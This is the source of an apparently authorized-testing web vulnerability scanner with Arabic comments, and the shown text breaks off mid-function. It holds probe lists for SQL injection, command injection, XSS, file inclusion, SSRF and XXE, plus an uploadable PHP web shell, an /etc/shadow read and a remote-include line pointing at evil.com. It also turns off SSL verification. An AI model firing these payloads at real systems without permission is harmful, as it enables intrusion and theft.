#!/usr/bin/env python3
"""
DrmnefWebScanner - Advanced Web Vulnerability Scanner
Professional Security Tool for Authorized Penetration Testing
Specialized in RCE, SQL Injection, XSS, File Upload, LFI, RFI vulnerabilities
For Authorized Security Testing Only - Ethical Use Required
Version: 3.0
Author: Drmnef (Mnefal Alenzi)
Email: mnefal3nzi@gmail.com
GitHub: https://github.com/mnefal-3nzi
"""

import requests
import time
import sys
import json
import re
import os
import argparse
import threading
import queue
from typing import Dict, List, Tuple, Optional, Set, Any
from urllib.parse import urlparse, parse_qs, urljoin, quote, unquote
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import socket
import ssl
from pathlib import Path
import hashlib
import random
import base64
import html
import xml.etree.ElementTree as ET

# ألوان للواجهة
class Color:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'

class VulnerabilityType:
    """أنواع الثغرات"""
    # SQL Injection
    SQL_INJECTION = "SQL Injection"
    BLIND_SQLI = "Blind SQL Injection"
    TIME_BASED_SQLI = "Time-Based SQL Injection"
    BOOLEAN_BASED_SQLI = "Boolean-Based SQL Injection"
    UNION_BASED_SQLI = "Union-Based SQL Injection"
    ERROR_BASED_SQLI = "Error-Based SQL Injection"
    
    # Remote Code Execution
    RCE = "Remote Code Execution"
    CODE_INJECTION = "Code Injection"
    COMMAND_INJECTION = "Command Injection"
    DESERIALIZATION = "Deserialization Vulnerability"
    
    # XSS
    XSS = "Cross-Site Scripting"
    XSS_REFLECTED = "Reflected XSS"
    XSS_STORED = "Stored XSS"
    XSS_DOM = "DOM-Based XSS"
    
    # File Upload
    FILE_UPLOAD = "File Upload Vulnerability"
    MALICIOUS_FILE_UPLOAD = "Malicious File Upload"
    
    # File Inclusion
    LFI = "Local File Inclusion"
    RFI = "Remote File Inclusion"
    
    # Other Web Vulns
    SSRF = "Server-Side Request Forgery"
    XXE = "XML External Entity"
    IDOR = "Insecure Direct Object References"
    CSRF = "Cross-Site Request Forgery"
    OPEN_REDIRECT = "Open Redirect"
    INFO_DISCLOSURE = "Information Disclosure"
    CMD_INJECTION = "Command Injection"
    PATH_TRAVERSAL = "Path Traversal"
    SSTI = "Server-Side Template Injection"

class SeverityLevel:
    """مستويات الخطورة"""
    CRITICAL = "Critical"
    HIGH = "High"
    MEDIUM = "Medium"
    LOW = "Low"
    INFO = "Information"

class WebVulnerabilityScanner:
    def __init__(self):
        self.target_url = ""
        self.target_domain = ""
        self.threads = 20
        self.timeout = 10
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        self.proxies = None
        self.follow_redirects = True
        self.delay = 0.1
        self.scan_depth = 3
        self.verbose = False
        self.max_requests = 1000
        
        # الاكتشافات
        self.discovered_forms = []
        self.discovered_params = []
        self.discovered_urls = []
        self.discovered_apis = []
        self.discovered_js = []
        
        # الجلسة
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': self.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
        })
        
        # تعطيل تحذيرات SSL
        try:
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        except:
            pass
        
        # قواميس الحمولات المتقدمة
        self.sql_payloads = self._load_advanced_sql_payloads()
        self.rce_payloads = self._load_advanced_rce_payloads()
        self.xss_payloads = self._load_advanced_xss_payloads()
        self.upload_payloads = self._load_advanced_upload_payloads()
        self.lfi_payloads = self._load_advanced_lfi_payloads()
        self.rfi_payloads = self._load_advanced_rfi_payloads()
        self.ssrf_payloads = self._load_advanced_ssrf_payloads()
        self.xxe_payloads = self._load_advanced_xxe_payloads()
        self.idor_payloads = self._load_advanced_idor_payloads()
        self.ssti_payloads = self._load_advanced_ssti_payloads()
        
        # قوائم الأخطاء والمؤشرات
        self.sql_errors = self._load_sql_errors()
        self.rce_errors = self._load_rce_errors()
        self.xss_errors = self._load_xss_errors()
        self.lfi_errors = self._load_lfi_errors()
        self.xxe_errors = self._load_xxe_errors()
        self.rfi_errors = self._load_rfi_errors()
        
        # نتائج الفحص
        self.scan_results = {
            'vulnerabilities': [],
            'critical_vulnerabilities': [],
            'high_vulnerabilities': [],
            'medium_vulnerabilities': [],
            'low_vulnerabilities': [],
            'server_info': {},
            'technology_stack': [],
            'database_type': None,
            'endpoints_discovered': 0,
            'scan_duration': 0
        }
        
        # إحصائيات
        self.stats = {
            'total_requests': 0,
            'vulnerabilities_found': 0,
            'parameters_tested': 0,
            'forms_tested': 0,
            'start_time': None,
            'end_time': None,
            'requests_per_second': 0,
            'critical_count': 0,
            'high_count': 0,
            'medium_count': 0,
            'low_count': 0
        }
        
        # قائمة الأوامر
        self.commands = {
            'help': self.show_help,
            'scan': self.start_full_scan,
            'set': self.set_parameter,
            'show': self.show_results,
            'clear': self.clear_screen,
            'export': self.export_results,
            'exit': self.exit_scanner,
            'quit': self.exit_scanner,
            'test': self.test_connection,
            'crawl': self.crawl_for_parameters,
            'info': self.get_server_info,
            'report': self.generate_report,
            'stats': self.show_stats,
            'config': self.show_config,
            'load': self.load_targets,
            'save': self.save_results,
            'advanced': self.advanced_scan,
            'deep': self.deep_scan,
            # أوامر الفحص المتخصصة
            'sql': self.start_sql_scan,
            'rce': self.start_rce_scan,
            'xss': self.start_xss_scan,
            'upload': self.start_upload_scan,
            'lfi': self.start_lfi_scan,
            'rfi': self.start_rfi_scan,
            'ssrf': self.start_ssrf_scan,
            'xxe': self.start_xxe_scan,
            'idor': self.start_idor_scan,
            'csrf': self.start_csrf_scan,
            'ssti': self.start_ssti_scan,
        }
    
    # ============================================
    # تحميل الحمولات المتقدمة
    # ============================================
    
    def _load_advanced_sql_payloads(self):
        """حمولات SQL Injection متقدمة"""
        payloads = [
            # Basic Injection
            "'",
            "\"",
            "';",
            "\";",
            "' --",
            "\" --",
            "' #",
            "\" #",
            "'/*",
            "\"/*",
            
            # Union Injection
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            
            # Database version extraction
            "' UNION SELECT @@version--",
            "' UNION SELECT version()--",
            
            # User and database info
            "' UNION SELECT user()--",
            "' UNION SELECT database()--",
            
            # Time-Based Payloads
            "' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            
            # Error Based
            "' AND extractvalue(rand(),concat(0x3a,version()))--",
            
            # Boolean Based
            "' AND '1'='1",
            "' AND '1'='2",
        ]
        return payloads
    
    def _load_advanced_rce_payloads(self):
        """حمولات RCE متقدمة"""
        payloads = [
            # PHP RCE
            "'; system('id');",
            "'; exec('id');",
            "<?php system($_GET['cmd']); ?>",
            
            # Python RCE
            "__import__('os').system('id')",
            
            # Unix commands
            "id;",
            "id &&",
            "`id`",
            "$(id)",
            
            # Windows commands
            "whoami",
            "dir",
        ]
        return payloads
    
    def _load_advanced_xss_payloads(self):
        """حمولات XSS متقدمة"""
        payloads = [
            # Basic XSS
            "<script>alert('XSS')</script>",
            "<script>alert(document.domain)</script>",
            
            # Without script tags
            "\" onmouseover=\"alert('XSS')\"",
            "' onmouseover=\"alert('XSS')\"",
            
            # IMG XSS
            "<img src=x onerror=alert('XSS')>",
            
            # SVG XSS
            "<svg onload=\"alert('XSS')\">",
        ]
        return payloads
    
    def _load_advanced_upload_payloads(self):
        """حمولات رفع الملفات متقدمة"""
        payloads = [
            # PHP shells
            ("shell.php", "<?php system($_GET['cmd']); ?>"),
            ("shell.php5", "<?php system($_GET['cmd']); ?>"),
            
            # Double extensions
            ("shell.php.jpg", "<?php system($_GET['cmd']); ?>"),
            
            # Case manipulation
            ("shell.PhP", "<?php system($_GET['cmd']); ?>"),
        ]
        return payloads
    
    def _load_advanced_lfi_payloads(self):
        """حمولات LFI متقدمة"""
        payloads = [
            # Common Linux files
            "../../../../etc/passwd",
            "../../../../etc/shadow",
            
            # Windows files
            "../../../../Windows/win.ini",
            
            # PHP filters
            "php://filter/convert.base64-encode/resource=index.php",
        ]
        return payloads
    
    def _load_advanced_rfi_payloads(self):
        """حمولات RFI متقدمة"""
        payloads = [
            # Basic RFI
            "http://evil.com/shell.txt",
            
            # PHP wrappers
            "php://input",
            
            # Data wrapper
            "data:text/plain,<?php system('id'); ?>",
        ]
        return payloads
    
    def _load_advanced_ssrf_payloads(self):
        """حمولات SSRF متقدمة"""
        payloads = [
            # Basic SSRF
            "http://localhost",
            "http://127.0.0.1",
            
            # Metadata services
            "http://169.254.169.254/latest/meta-data/",
        ]
        return payloads
    
    def _load_advanced_xxe_payloads(self):
        """حمولات XXE متقدمة"""
        payloads = [
            # Basic XXE
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
        ]
        return payloads
    
    def _load_advanced_idor_payloads(self):
        """حمولات IDOR متقدمة"""
        payloads = [
            # Numeric IDs
            "1", "2", "10", "100",
            "0", "-1",
            
            # Admin IDs
            "admin", "administrator", "root",
        ]
        return payloads
    
    def _load_advanced_ssti_payloads(self):
        """حمولات SSTI متقدمة"""
        payloads = [
            # Basic SSTI detection
            "${7*7}",
            "{{7*7}}",
            "<%= 7*7 %>",
        ]
        return payloads
    
    def _load_sql_errors(self):
        """قائمة أخطاء SQL"""
        return [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"PostgreSQL.*ERROR",
            r"ORA-[0-9]{5}",
            r"unclosed quotation mark",
        ]
    
    def _load_rce_errors(self):
        """قائمة أخطاء RCE"""
        return [
            r"system\(\)",
            r"exec\(\)",
            r"shell_exec\(\)",
            r"Runtime\.getRuntime\(\)",
            r"sh: .*: command not found",
        ]
    
    def _load_xss_errors(self):
        """قائمة أخطاء XSS"""
        return [
            r"<script>",
            r"javascript:",
            r"onerror=",
            r"alert\(",
        ]
    
    def _load_lfi_errors(self):
        """قائمة أخطاء LFI"""
        return [
            r"failed to open stream",
            r"No such file or directory",
            r"file_get_contents",
            r"root:x:",
        ]
    
    def _load_xxe_errors(self):
        """قائمة أخطاء XXE"""
        return [
            r"DOCTYPE",
            r"ENTITY",
            r"SYSTEM",
            r"failed to load external entity",
        ]
    
    def _load_rfi_errors(self):
        """قائمة أخطاء RFI"""
        return [
            r"failed to open stream",
            r"failed to include",
            r"allow_url_include",
            r"allow_url_fopen",
        ]
    
    # ============================================
    # الوظائف الأساسية
    # ============================================
    
    def clear_screen(self, args=None):
        """مسح الشاشة"""
        os.system('clear' if os.name == 'posix' else 'cls')
        return f"{Color.GREEN}[✓] تم مسح الشاشة{Color.RESET}"
    
    def show_help(self, args=None):
        """عرض تعليمات الاستخدام"""
        help_text = f"""
{Color.CYAN}{Color.BOLD}═══════════════════════════════════════════════════════════════
            DrmnefWebScanner - Web Vulnerability Scanner   
         Advanced Security Scanner for Web Applications       
═══════════════════════════════════════════════════════════════{Color.RESET}

{Color.YELLOW}{Color.BOLD}📋 الوصف:{Color.RESET}
DrmnefWebScanner هي أداة متقدمة لمسح ثغرات تطبيقات الويب، مصممة خصيصًا لاكتشاف 
وتحليل نقاط الضعف في تطبيقات الويب.

{Color.YELLOW}{Color.BOLD}🎯 الأوامر الأساسية:{Color.RESET}

{Color.GREEN}help{Color.RESET}               - عرض هذه الرسالة
{Color.GREEN}scan{Color.RESET}              - بدء مسح شامل لجميع الثغرات
{Color.GREEN}set <param> <value>{Color.RESET} - ضبط إعدادات المسح
{Color.GREEN}show <type>{Color.RESET}        - عرض النتائج
{Color.GREEN}clear{Color.RESET}             - مسح الشاشة
{Color.GREEN}export <format>{Color.RESET}    - تصدير النتائج
{Color.GREEN}exit / quit{Color.RESET}       - الخروج من البرنامج
{Color.GREEN}test{Color.RESET}              - اختبار الاتصال بالهدف

{Color.YELLOW}{Color.BOLD}🔍 أوامر الفحص المتخصصة:{Color.RESET}

{Color.GREEN}crawl{Color.RESET}             - زحف الموقع لاكتشاف النقاط المحتملة
{Color.GREEN}sql{Color.RESET}               - فحص SQL Injection
{Color.GREEN}rce{Color.RESET}               - فحص Remote Code Execution
{Color.GREEN}xss{Color.RESET}               - فحص Cross-Site Scripting
{Color.GREEN}upload{Color.RESET}            - فحص ثغرات رفع الملفات
{Color.GREEN}lfi{Color.RESET}               - فحص Local File Inclusion
{Color.GREEN}rfi{Color.RESET}               - فحص Remote File Inclusion
{Color.GREEN}ssrf{Color.RESET}              - فحص Server-Side Request Forgery
{Color.GREEN}xxe{Color.RESET}               - فحص XML External Entity
{Color.GREEN}idor{Color.RESET}              - فحص Insecure Direct Object References
{Color.GREEN}csrf{Color.RESET}              - فحص Cross-Site Request Forgery
{Color.GREEN}ssti{Color.RESET}              - فحص Server-Side Template Injection

{Color.YELLOW}{Color.BOLD}📝 أمثلة:{Color.RESET}

set target https://example.com
set threads 30
set verbose true
scan
show critical
export html

{Color.RED}{Color.BOLD}⚠️ ملاحظة:{Color.RESET} هذه الأداة للإستخدام الأخلاقي فقط.
يجب الحصول على إذن كتابي قبل فحص أي نظام.
"""
        return help_text
    
    def set_parameter(self, args):
        """ضبط معاملات المسح"""
        if len(args) < 2:
            return f"{Color.RED}[✗] صيغة الأمر: set <parameter> <value>{Color.RESET}"
        
        param = args[0].lower()
        value = args[1]
        
        if param == "target":
            if not value.startswith(("http://", "https://")):
                value = "https://" + value
            
            try:
                parsed = urlparse(value)
                if not parsed.netloc:
                    return f"{Color.RED}[✗] رابط غير صالح{Color.RESET}"
                
                self.target_url = value.rstrip('/')
                self.target_domain = parsed.netloc
                
                return f"{Color.GREEN}[✓] تم تعيين الهدف: {self.target_url}{Color.RESET}"
            
            except Exception as e:
                return f"{Color.RED}[✗] رابط غير صالح: {str(e)}{Color.RESET}"
        
        elif param == "threads":
            try:
                threads = int(value)
                if 1 <= threads <= 100:
                    self.threads = threads
                    return f"{Color.GREEN}[✓] تم ضبط عدد الثريدات: {threads}{Color.RESET}"
                else:
                    return f"{Color.RED}[✗] عدد الثريدات يجب أن يكون بين 1 و 100{Color.RESET}"
            except ValueError:
                return f"{Color.RED}[✗] عدد الثريدات يجب أن يكون رقمًا{Color.RESET}"
        
        elif param == "timeout":
            try:
                timeout = int(value)
                if 1 <= timeout <= 60:
                    self.timeout = timeout
                    return f"{Color.GREEN}[✓] تم ضبط المهلة: {timeout} ثانية{Color.RESET}"
                else:
                    return f"{Color.RED}[✗] المهلة يجب أن تكون بين 1 و 60 ثانية{Color.RESET}"
            except ValueError:
                return f"{Color.RED}[✗] المهلة يجب أن تكون رقمًا{Color.RESET}"
        
        elif param == "delay":
            try:
                delay = float(value)
                if 0 <= delay <= 5:
                    self.delay = delay
                    return f"{Color.GREEN}[✓] تم ضبط التأخير: {delay} ثانية{Color.RESET}"
                else:
                    return f"{Color.RED}[✗] التأخير يجب أن يكون بين 0 و 5 ثواني{Color.RESET}"
            except ValueError:
                return f"{Color.RED}[✗] التأخير يجب أن يكون رقمًا{Color.RESET}"
        
        elif param == "proxy":
            if value.lower() == "none":
                self.proxies = None
                self.session.proxies.clear()
                return f"{Color.GREEN}[✓] تم إلغاء إعدادات البروكسي{Color.RESET}"
            else:
                try:
                    self.proxies = {
                        'http': value,
                        'https': value
                    }
                    self.session.proxies.update(self.proxies)
                    return f"{Color.GREEN}[✓] تم تعيين البروكسي: {value}{Color.RESET}"
                except Exception as e:
                    return f"{Color.RED}[✗] بروكسي غير صالح: {str(e)}{Color.RESET}"
        
        elif param == "depth":
            try:
                depth = int(value)
                if 1 <= depth <= 10:
                    self.scan_depth = depth
                    return f"{Color.GREEN}[✓] تم ضبط عمق الزحف: {depth}{Color.RESET}"
                else:
                    return f"{Color.RED}[✗] عمق الزحف يجب أن يكون بين 1 و 10{Color.RESET}"
            except ValueError:
                return f"{Color.RED}[✗] عمق الزحف يجب أن يكون رقمًا{Color.RESET}"
        
        elif param == "verbose":
            if value.lower() in ["true", "yes", "1", "on"]:
                self.verbose = True
                return f"{Color.GREEN}[✓] تم تفعيل وضع التفصيل{Color.RESET}"
            elif value.lower() in ["false", "no", "0", "off"]:
                self.verbose = False
                return f"{Color.GREEN}[✓] تم تعطيل وضع التفصيل{Color.RESET}"
            else:
                return f"{Color.RED}[✗] قيمة غير صالحة لـ verbose{Color.RESET}"
        
        elif param == "max_requests":
            try:
                max_req = int(value)
                if 1 <= max_req <= 10000:
                    self.max_requests = max_req
                    return f"{Color.GREEN}[✓] تم ضبط الحد الأقصى للطلبات: {max_req}{Color.RESET}"
                else:
                    return f"{Color.RED}[✗] الحد الأقصى للطلبات يجب أن يكون بين 1 و 10000{Color.RESET}"
            except ValueError:
                return f"{Color.RED}[✗] الحد الأقصى للطلبات يجب أن يكون رقمًا{Color.RESET}"
        
        else:
            return f"{Color.RED}[✗] معامل غير معروف: {param}{Color.RESET}"
    
    def test_connection(self, args=None):
        """اختبار الاتصال بالهدف"""
        if not self.target_url:
            return f"{Color.RED}[✗] الرجاء تعيين الهدف أولاً{Color.RESET}"
        
        try:
            print(f"{Color.CYAN}[*] اختبار الاتصال بـ {self.target_url}...{Color.RESET}")
            
            start_time = time.time()
            response = self.session.get(
                self.target_url,
                timeout=self.timeout,
                allow_redirects=self.follow_redirects
            )
            
            elapsed = (time.time() - start_time) * 1000
            
            # جمع معلومات السيرفر
            server_info = {
                'server': response.headers.get('Server', 'غير معروف'),
                'x-powered-by': response.headers.get('X-Powered-By', 'غير معروف'),
                'content-type': response.headers.get('Content-Type', 'غير معروف'),
                'x-frame-options': response.headers.get('X-Frame-Options', 'غير محدد'),
                'content-security-policy': response.headers.get('Content-Security-Policy', 'غير محدد'),
            }
            
            # اكتشاف التقنيات
            content = response.text.lower()
            tech_detected = self._detect_technologies(content, response.headers)
            
            summary = f"""
{Color.CYAN}{Color.BOLD}نتائج اختبار الاتصال:{Color.RESET}

{Color.YELLOW}الهدف:{Color.RESET} {self.target_url}
{Color.YELLOW}الحالة:{Color.RESET} {response.status_code} ({elapsed:.2f}ms)
{Color.YELLOW}السيرفر:{Color.RESET} {server_info['server']}
{Color.YELLOW}Powered By:{Color.RESET} {server_info['x-powered-by']}
{Color.YELLOW}نوع المحتوى:{Color.RESET} {server_info['content-type']}

{Color.YELLOW}🔧 التقنيات المكتشفة:{Color.RESET}
{tech_detected}

{Color.YELLOW}📊 معلومات إضافية:{Color.RESET}
• حجم الاستجابة: {len(response.content):,} بايت
"""
            
            # حفظ معلومات السيرفر
            self.scan_results['server_info'] = server_info
            
            return summary
        
        except Exception as e:
            return f"{Color.RED}[✗] فشل الاتصال: {str(e)}{Color.RESET}"
    
    def _detect_technologies(self, content, headers):
        """اكتشاف التقنيات المستخدمة"""
        technologies = []
        
        # من رؤوس HTTP
        server = headers.get('Server', '').lower()
        powered_by = headers.get('X-Powered-By', '').lower()
        
        if 'apache' in server:
            technologies.append('Apache')
        if 'nginx' in server:
            technologies.append('Nginx')
        if 'iis' in server:
            technologies.append('IIS')
        
        if 'php' in powered_by:
            technologies.append('PHP')
        if 'asp.net' in powered_by:
            technologies.append('ASP.NET')
        
        # من محتوى الصفحة
        if 'php' in content or '.php' in content:
            technologies.append('PHP')
        if 'asp' in content or 'aspx' in content:
            technologies.append('ASP.NET')
        if 'wordpress' in content:
            technologies.append('WordPress')
        if 'laravel' in content:
            technologies.append('Laravel')
        
        # قواعد البيانات
        if 'mysql' in content:
            technologies.append('MySQL')
        
        # إزالة التكرارات
        technologies = list(set(technologies))
        
        if technologies:
            return "• " + "\n• ".join(technologies)
        else:
            return "• لم يتم اكتشاف تقنيات واضحة"
    
    # ============================================
    # الزحف المتقدم
    # ============================================
    
    def crawl_for_parameters(self, args=None):
        """زحف الموقع لاكتشاف نقاط الدخول المحتملة"""
        if not self.target_url:
            return f"{Color.RED}[✗] الرجاء تعيين الهدف أولاً{Color.RESET}"
        
        print(f"{Color.CYAN}[*] بدء الزحف المتقدم للموقع...{Color.RESET}")
        
        visited = set()
        to_visit = [(self.target_url, 0)]
        discovered_urls = []
        discovered_forms = []
        discovered_apis = []
        discovered_js = []
        
        max_pages = min(self.max_requests, 500)
        max_depth = self.scan_depth
        
        while to_visit and len(visited) < max_pages:
            current_url, depth = to_visit.pop(0)
            
            if current_url in visited or depth > max_depth:
                continue
            
            visited.add(current_url)
            
            try:
                result = self._advanced_crawl_page(current_url, depth)
                if result:
                    links, forms, apis, js_files = result
                    
                    discovered_urls.append({
                        'url': current_url,
                        'depth': depth,
                        'links': len(links),
                        'forms': len(forms),
                        'apis': len(apis),
                        'js': len(js_files)
                    })
                    
                    if forms:
                        discovered_forms.extend(forms)
                    
                    if apis:
                        discovered_apis.extend(apis)
                    
                    if js_files:
                        discovered_js.extend(js_files)
                    
                    if self.verbose:
                        print(f"{Color.GREEN}[+] {current_url} - عمق {depth}{Color.RESET}")
                    
                    for link in links:
                        if link not in visited and link not in [u for u, _ in to_visit]:
                            to_visit.append((link, depth + 1))
                
            except Exception as e:
                if self.verbose:
                    print(f"{Color.RED}[-] خطأ في {current_url}: {str(e)[:50]}...{Color.RESET}")
        
        self.discovered_forms = discovered_forms
        self.discovered_urls = discovered_urls
        self.discovered_apis = discovered_apis
        self.discovered_js = discovered_js
        
        # استخراج المعاملات من الروابط
        discovered_params = []
        for url_info in discovered_urls:
            url = url_info['url']
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)
            
            if query_params:
                for param in query_params.keys():
                    param_info = {
                        'url': url,
                        'parameter': param,
                        'type': 'GET',
                        'value': query_params[param][0] if query_params[param] else ''
                    }
                    discovered_params.append(param_info)
        
        self.discovered_params = discovered_params
        
        return f"""{Color.GREEN}[✓] تم إكمال الزحف المتقدم{Color.RESET}

{Color.CYAN}الإحصائيات:{Color.RESET}
• الصفحات المزحوفة: {len(discovered_urls)}
• النماذج المكتشفة: {len(discovered_forms)}
• المعاملات المكتشفة: {len(discovered_params)}
• نقاط API: {len(discovered_apis)}
• ملفات JavaScript: {len(discovered_js)}"""
    
    def _advanced_crawl_page(self, url, depth):
        """زحف صفحة واحدة متقدم"""
        try:
            if self.delay > 0:
                time.sleep(self.delay)
            
            response = self.session.get(
                url,
                timeout=self.timeout,
                allow_redirects=self.follow_redirects
            )
            
            self.stats['total_requests'] += 1
            
            if response.status_code == 200:
                content_type = response.headers.get('Content-Type', '')
                content = response.text
                
                if 'text/html' in content_type.lower():
                    # استخراج الروابط
                    links = self._extract_links(content, url)
                    
                    # استخراج النماذج
                    forms = self._extract_forms(content, url)
                    
                    # اكتشاف APIs
                    apis = self._extract_apis(content, url)
                    
                    # اكتشاف ملفات JavaScript
                    js_files = self._extract_js_files(content, url)
                    
                    return links, forms, apis, js_files
                else:
                    return [], [], [], []
        
        except Exception as e:
            if self.verbose:
                print(f"{Color.RED}[-] خطأ في زحف {url}: {str(e)[:50]}...{Color.RESET}")
        
        return [], [], [], []
    
    def _extract_links(self, html, base_url):
        """استخراج الروابط من HTML"""
        links = set()
        
        # روابط href
        for match in re.finditer(r'href\s*=\s*["\']([^"\']+)["\']', html, re.IGNORECASE):
            link = match.group(1).strip()
            if link and not link.startswith(('#', 'javascript:', 'mailto:', 'tel:', 'data:')):
                absolute_link = urljoin(base_url, link.split('#')[0].split('?')[0])
                parsed_link = urlparse(absolute_link)
                if parsed_link.netloc == urlparse(self.target_url).netloc:
                    links.add(absolute_link.rstrip('/'))
        
        return list(links)
    
    def _extract_forms(self, html, base_url):
        """استخراج النماذج من HTML"""
        forms = []
        form_pattern = r'<form[^>]*>(.*?)</form>'
        
        for match in re.finditer(form_pattern, html, re.IGNORECASE | re.DOTALL):
            form_html = match.group(0)
            
            # استخراج خصائص النموذج
            action_match = re.search(r'action\s*=\s*["\']([^"\']*)["\']', form_html, re.IGNORECASE)
            method_match = re.search(r'method\s*=\s*["\']([^"\']*)["\']', form_html, re.IGNORECASE)
            
            action = action_match.group(1) if action_match else ''
            method = method_match.group(1).upper() if method_match else 'POST'
            
            # استخراج الحقول
            form_fields = self._extract_form_fields(form_html)
            
            if form_fields:
                form_action = urljoin(base_url, action) if action else base_url
                
                forms.append({
                    'action': form_action,
                    'method': method,
                    'fields': form_fields,
                    'source_url': base_url,
                })
        
        return forms
    
    def _extract_form_fields(self, form_html):
        """استخراج حقول النموذج"""
        fields = []
        
        # حقول input
        for input_match in re.finditer(r'<input[^>]*>', form_html, re.IGNORECASE):
            input_tag = input_match.group(0)
            
            name_match = re.search(r'name\s*=\s*["\']([^"\']*)["\']', input_tag, re.IGNORECASE)
            type_match = re.search(r'type\s*=\s*["\']([^"\']*)["\']', input_tag, re.IGNORECASE)
            
            if name_match:
                field_name = name_match.group(1)
                field_type = type_match.group(1).lower() if type_match else 'text'
                
                if field_type not in ['submit', 'button', 'image', 'reset']:
                    fields.append({
                        'name': field_name,
                        'type': field_type,
                        'tag': 'input'
                    })
        
        return fields
    
    def _extract_apis(self, content, base_url):
        """استخراج نقاط API"""
        apis = []
        
        # البحث عن روابط API
        api_patterns = [
            r'["\'](/api/[^"\']+)["\']',
            r'["\'](/v[0-9]+/[^"\']+)["\']',
            r'["\'](/rest/[^"\']+)["\']',
        ]
        
        for pattern in api_patterns:
            for match in re.finditer(pattern, content, re.IGNORECASE):
                api_path = match.group(1)
                absolute_url = urljoin(base_url, api_path)
                apis.append({
                    'url': absolute_url,
                    'type': 'API',
                    'source': 'HTML'
                })
        
        return apis
    
    def _extract_js_files(self, html, base_url):
        """استخراج ملفات JavaScript"""
        js_files = []
        
        # من وسم script
        for match in re.finditer(r'<script[^>]*src\s*=\s*["\']([^"\']+)["\'][^>]*>', html, re.IGNORECASE):
            js_path = match.group(1)
            if js_path.endswith('.js'):
                absolute_url = urljoin(base_url, js_path)
                js_files.append(absolute_url)
        
        return js_files
    
    # ============================================
    # فحص SQL Injection
    # ============================================
    
    def start_sql_scan(self, args=None):
        """بدء فحص SQL Injection متقدم"""
        if not self.target_url:
            return f"{Color.RED}[✗] الرجاء تعيين الهدف أولاً{Color.RESET}"
        
        print(f"{Color.CYAN}{Color.BOLD}[*] بدء فحص SQL Injection...{Color.RESET}")
        
        # زحف إذا لم يتم الاكتشاف مسبقاً
        if not self.discovered_params and not self.discovered_forms:
            print(f"{Color.YELLOW}[*] جارٍ الزحف لاكتشاف نقاط الدخول...{Color.RESET}")
            self.crawl_for_parameters()
        
        vulnerabilities = []
        tested_points = 0
        
        # فحص معاملات URL
        print(f"{Color.YELLOW}[*] فحص معاملات URL لـ SQL Injection...{Color.RESET}")
        for param_info in self.discovered_params[:10]:  # أول 10 معاملات فقط
            if tested_points >= 20:  # الحد الأقصى
                break
            
            result = self._test_sql_injection(param_info)
            tested_points += 1
            
            if result and result.get('vulnerable', False):
                vulnerabilities.append(result)
                self._display_vulnerability(result)
        
        self.scan_results['vulnerabilities'].extend(vulnerabilities)
        self.stats['vulnerabilities_found'] += len(vulnerabilities)
        
        return f"""{Color.GREEN}[✓] تم إكمال فحص SQL Injection{Color.RESET}

{Color.CYAN}الإحصائيات:{Color.RESET}
• النقاط المختبرة: {tested_points}
• الثغرات المكتشفة: {len(vulnerabilities)}"""
    
    def _test_sql_injection(self, param_info):
        """اختبار SQL Injection على معلمة"""
        try:
            url = param_info['url']
            parameter = param_info['parameter']
            
            # اختبار حمولات SQL
            test_payloads = ["'", "\"", "' OR '1'='1", "' AND '1'='1"]
            
            for payload in test_payloads:
                if self.delay > 0:
                    time.sleep(self.delay)
                
                test_url = self._build_test_url(url, parameter, payload)
                response = self._send_request(test_url)
                
                if response and self._check_sql_errors(response.text):
                    return {
                        'type': VulnerabilityType.SQL_INJECTION,
                        'severity': SeverityLevel.CRITICAL,
                        'url': test_url,
                        'parameter': parameter,
                        'parameter_type': 'URL',
                        'payload': payload,
                        'method': 'GET',
                        'response_code': response.status_code,
                        'details': f"تم اكتشاف SQL Injection في المعلمة '{parameter}'",
                        'discovery_time': datetime.now().isoformat(),
                        'vulnerable': True
                    }
            
            return {'vulnerable': False}
        
        except Exception as e:
            if self.verbose:
                print(f"{Color.RED}[-] خطأ في اختبار SQL Injection: {str(e)[:50]}...{Color.RESET}")
            return {'vulnerable': False, 'error': str(e)}
    
    # ============================================
    # فحص RCE
    # ============================================
    
    def start_rce_scan(self, args=None):
        """بدء فحص RCE متقدم"""
        if not self.target_url:
            return f"{Color.RED}[✗] الرجاء تعيين الهدف أولاً{Color.RESET}"
        
        print(f"{Color.CYAN}{Color.BOLD}[*] بدء فحص Remote Code Execution...{Color.RESET}")
        
        vulnerabilities = []
        tested_points = 0
        
        # فحص معاملات URL
        print(f"{Color.YELLOW}[*] فحص معاملات URL لـ RCE...{Color.RESET}")
        for param_info in self.discovered_params[:10]:
            if tested_points >= 20:
                break
            
            result = self._test_rce_injection(param_info)
            tested_points += 1
            
            if result and result.get('vulnerable', False):
                vulnerabilities.append(result)
                self._display_vulnerability(result)
        
        self.scan_results['vulnerabilities'].extend(vulnerabilities)
        self.stats['vulnerabilities_found'] += len(vulnerabilities)
        
        return f"""{Color.GREEN}[✓] تم إكمال فحص RCE{Color.RESET}

{Color.CYAN}الإحصائيات:{Color.RESET}
• النقاط المختبرة: {tested_points}
• الثغرات المكتشفة: {len(vulnerabilities)}"""
    
    def _test_rce_injection(self, param_info):
        """اختبار RCE على معلمة"""
        try:
            rce_payloads = [
                "; id",
                "| id",
                "`id`",
                "$(id)",
            ]
            
